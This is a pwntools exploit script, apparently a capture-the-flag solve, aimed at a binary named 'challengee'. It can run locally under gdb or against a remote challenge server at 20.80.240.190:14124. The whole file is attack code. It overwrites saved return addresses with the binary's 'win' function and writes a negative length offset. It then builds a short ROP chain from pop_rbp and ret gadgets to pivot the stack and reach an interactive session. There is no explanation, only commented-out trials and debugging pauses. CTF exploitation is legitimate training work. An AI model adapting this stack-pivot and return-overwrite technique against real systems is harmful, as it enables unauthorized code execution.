#!/usr/bin/env python3
from pwn import *

exe = ELF("./challengee")
# context.log_level='debug'
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("20.80.240.190", 14124)
else:
    p = process([exe.path])
    p = gdb.debug([exe.path],"""

                    """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
rbp = 0x4047e8
pop_rbp = 0x0000000000401019
gadget = 0x0000000000401101
ret = 0x0000000000401115
user = 0x404000
# first
#return of read of the first time
sa(b"!",p64(exe.sym.vuln))
s(p64(exe.sym.win))
s(p64(exe.sym.win))
# s(p32(exe.sym.vuln+25))
s(p64(exe.sym.win))
# the last return is actually here
s(p64(exe.sym.win))
s(p64(exe.sym.win))
s(p64(exe.sym.win))
for i in range(6):
    input()
    print(i)
    s(b"a"*8)

dead_offset = 4294967280
s(b"a"*4+p32(dead_offset))

s(p32(ret))
# s(b"admin\0")
#second to expand the rop area
# ROP
s(p64(pop_rbp))
s(p64(exe.sym.user+0x70))
s(p64(exe.sym.vuln+62))
for i in range(10):
    input()
    print(i)
    s(b"c"*8)
s(b"b"*4+p32(4294967280))
# padding
s(p64(ret))
s(b"admin\0")
# send return to start ropping



p.interactive()
# good luck pwning :)

